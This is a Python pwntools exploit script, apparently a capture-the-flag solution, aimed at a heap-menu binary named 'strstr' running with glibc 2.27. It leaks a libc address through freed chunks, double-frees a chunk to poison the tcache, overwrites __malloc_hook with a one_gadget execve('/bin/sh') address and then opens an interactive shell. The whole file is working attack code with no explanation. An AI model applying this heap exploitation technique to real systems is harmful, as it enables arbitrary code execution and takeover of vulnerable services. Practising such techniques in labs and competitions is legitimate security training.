from pwn import *
context.log_level = 'debug'

TARGET = './strstr'
LIBC = './libc-2.27.so'
HOST = 'localhost'
PORT = 10006

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
r = remote(HOST, PORT)

gdb.attach(r, '''
c
''')
elf = ELF(TARGET)
libc = ELF(LIBC)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def store(index, string): 
    r.sendlineafter('command:', '0')
    r.sendlineafter('index:', str(index))
    r.sendlineafter('string:', string)

def show(index):
    r.sendlineafter('command:', '1')
    r.sendlineafter('index:', str(index))
    return r.recvuntil('\n')

def delete(index):
    r.sendlineafter('command:', '2')
    r.sendlineafter('index:', str(index))


n = 8
for i in range(n):
    store(i, 'A'*0xff)

for i in range(n):
    delete(n-1-i)

leak = u64(show(0)[1:-1].ljust(8, '\x00'))
base = leak - (0x00007f100f357ca0 - 0x00007f100ef6c000)
dbg("leak")
dbg("base")
# pause()

system = base + libc.sym['system']
binsh = base + next(libc.search("/bin/sh"))
malloc_hook = base + 0x3ebc30
gadget = [
    0x4f2c5, # execve("/bin/sh", rsp+0x40, environ)
    0x4f322, # execve("/bin/sh", rsp+0x40, environ)
    0x10a38c # execve("/bin/sh", rsp+0x70, environ)
]

store(0, 'AAAA')
delete(0)
delete(0)
store(0, p64(malloc_hook))
# pause()
store(0, 'hoge')
store(0, p64(base + gadget[2]))
pause()


r.sendlineafter('command:', '0')
r.sendlineafter('index:', '0')
r.sendlineafter('string:', '0')

r.interactive() 
r.close()
